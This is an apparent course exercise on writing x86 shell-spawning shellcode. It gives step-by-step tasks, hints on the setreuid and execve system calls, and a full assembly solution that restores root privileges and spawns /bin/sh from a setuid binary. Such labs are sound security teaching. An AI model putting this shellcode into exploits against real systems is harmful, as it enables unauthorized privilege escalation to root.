# Shell-Spawning Code (Version. 1)

* (SPOILER) Reference: [0x2a4 Shell-Spawning Code](https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html)

## TODO
1. Before you start, ensure that you are a non-root user!
2. Write a shellcode that spawns normal user shell on **x86**. Add some codes so that it can also spawn a root shell, when you are running a `setuid` root program with the root privileges! Compile the code.
3. Execute the program, and check if the program spawns a normal user shell correctly.
4. Switch your account to root, and do the Step 3 again. If it spawns a root shell successfully, go to the next!
5. With being granted root privilege temporarily, change the owner of the program as root.
6. With being granted root privilege temporarily, set the `setuid` bit.
7. Execute the program as a non-root user again, and check the user of the spawned shell with a command. Are you root or not?

### Constraints
1. Declare just one variable; define a string something like `fpath = "(PATH)XXXXAAAABBBBCCCC"`. You can adjust the masking alphabet part. (Example: /my/path/helloXABBCCCCD)
2. Use `fpath` for ALL arguments that load an address.

## Hints
<details>
  <summary><b>SPOILERS</b></summary>

### Hint 1: System Calls
    // NR = 70
    int setreuid(uid_t ruid, uid_t euid);

    // NR = 11
    int execve(const char *pathname, char *const _Nullable argv[],
                  char *const _Nullable envp[]);

### Hint 2: Section
1. `.data`: The data section

    a. String "/bin/shXXXX" (Note: Just an example for the hint! Might not be the final.)
   
2. `.text`: The code section

    a. `.global`: `_start` (The entry point of the program)
  
    b. `_start`

    * int setreuid(uid_t *ruid*, uid_t *euid*);
    * int execve(const char **pathname*, char **const* _Nullable *argv[]*, char *const _Nullable *envp[]*);

### Hint 3: Execution

1. (TODO 1~3) Compile & Execute as Normal User

   a. `gcc`: GNU Compiler. Need to generate code for IA-32 architecture.

   b. `ld`: GNU Linker. Need to output 32-bit code.

   c. Execute the output.

2. (TODO 4) Switch to Root, and Do Step 1 Again

   a. `su`: A command to switch account to root.

   b. `cd`: A command to change directory.

3. (TODO 5) Change the Owner of the Program with Root Privilege Temporarily

   a. `sudo`: A command to temporarily being granted root privilege.

   b. `chown`: A command to change the owner of the program.
   
5. (TODO 6) Set the `setuid` bit to the Program with Root Privilege Temporarily

   a. `sudo`: A command to temporarily being granted root privilege.

   b. `chmod`: A command to set the `setuid` bit.

</details>

## Solution
<details>
  <summary><b>SPOILERS</b></summary>

    .data
    filepath:
            .string "/bin/shXAAAABBBB"
    .text
    .global _start
    _start:
            movl $70, %eax
            movl $0, %ebx
            movl $0, %ecx
            int $0x80
    
            movl $0, %eax
            movl $filepath, %ebx
            movb %al, 7(%ebx)
            movl %ebx, 8(%ebx)
            movl %eax, 12(%ebx)
    
            movl $11, %eax
            leal 8(%ebx), %ecx
            leal 12(%ebx), %edx
            int $0x80

### `setreuid`
Linux manual page: [setreuid](https://man7.org/linux/man-pages/man2/setreuid.2.html)

* `setuid` root programs usually drop root privileges for the security purposes. Therefore, even if a shellcode has the `setuid` bit, if it runs only `execve`, it will always spawn a normal user shell for the normal user.

</details>
